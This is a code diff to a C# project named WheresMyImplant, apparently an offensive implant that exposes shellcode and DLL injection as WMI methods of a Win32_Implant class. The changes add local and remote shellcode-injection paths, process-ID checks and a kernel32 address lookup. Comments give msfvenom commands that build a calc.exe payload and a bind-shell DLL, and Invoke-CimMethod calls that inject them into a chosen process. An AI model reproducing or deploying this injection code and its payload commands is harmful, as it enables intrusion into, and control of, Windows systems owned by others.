@@ -85,19 +85,36 @@ namespace WheresMyImplant
         }
         
         [ManagementTask]
-        public static string InjectShellCode(string shellCodeString, Int32 processId)
+        //msfvenom -p windows/x64/exec --format csharp CMD=calc.exe
+        //Invoke-CimMethod -Class Win32_Implant -Name InjectShellCode -Argument @{shellCodeString=$payload; processId=432}
+        public static string InjectShellCode(string shellCodeString, String strProcessId)
         {
-            //msfvenom -p windows/x64/exec --format csharp CMD=calc.exe
-            //Invoke-CimMethod -Class Win32_Implant -Name InjectShellCodeRemote -Argument @{shellCodeString=$payload; processId=[UInt32]432}
-            InjectShellCodeRemote injectShellCodeRemote = new InjectShellCodeRemote(shellCodeString, (UInt32)processId);
-            return injectShellCodeRemote.GetOutput();
+            Int32 dwProcessId = 0;
+            if (String.IsNullOrEmpty(strProcessId))
+            {
+                using (InjectShellCode injectShellCode = new InjectShellCode(shellCodeString))
+                {
+                    injectShellCode.Execute();
+                    return injectShellCode.GetOutput();
+                }
+            }
+            else if (Int32.TryParse(strProcessId, out dwProcessId))
+            {
+                using (InjectShellCodeRemote injectShellCodeRemote = new InjectShellCodeRemote(shellCodeString, (UInt32)dwProcessId))
+                {
+                    injectShellCodeRemote.Execute();
+                    return injectShellCodeRemote.GetOutput();
+                }
+            }
+            else
+            {
+                return "Invalid Process ID";
+            }
         }
 
         [ManagementTask]
         public static string InjectShellCodeWMIFSB64(string wmiClass, string fileName, Int32 processId)
         {
-            //msfvenom -p windows/x64/exec --format csharp CMD=calc.exe
-            //Invoke-CimMethod -Class Win32_Implant -Name InjectShellCodeRemote -Argument @{shellCodeString=$payload; processId=[UInt32]432}
             ConnectionOptions options = new ConnectionOptions();
             options.Impersonation = System.Management.ImpersonationLevel.Impersonate;
             ManagementScope scope = new ManagementScope("\\\\.\\root\\cimv2", options);
@@ -126,6 +143,8 @@ namespace WheresMyImplant
             return injectShellCodeRemote.GetOutput();
         }
 
+        // Todo: Add Auto Token Privilege Elevation
+
         [ManagementTask]
         //msfvenom -p windows/x64/shell_bind_tcp --format dll --arch x64 > /tmp/bind64.dll
         //Invoke-CimMethod -ClassName Win32_Implant -Name InjectDll -Arguments @{library = "C:\bind64.dll"; processId = 3372}
@@ -137,14 +156,22 @@ namespace WheresMyImplant
                 LoadDll injectDll = new LoadDll(library);
                 return injectDll.GetOutput();
             }
-            Int32.TryParse(strProcessId, out dwProcessId);
+            else if (Int32.TryParse(strProcessId, out dwProcessId))
+            {
                 String output;
                 using (LoadDllRemote injectDllRemote = new LoadDllRemote(library, (UInt32)dwProcessId))
                 {
+                    UInt32 size = 0;
+                    Console.WriteLine(Misc.GetModuleAddress("kernel32.dll", (UInt32)dwProcessId, ref size));
                     injectDllRemote.Execute();
                     output = injectDllRemote.GetOutput();
                 }
                 return output;
+            }
+            else
+            {
+                return "Invalid Process ID";
+            }
         }
 
         [ManagementTask]
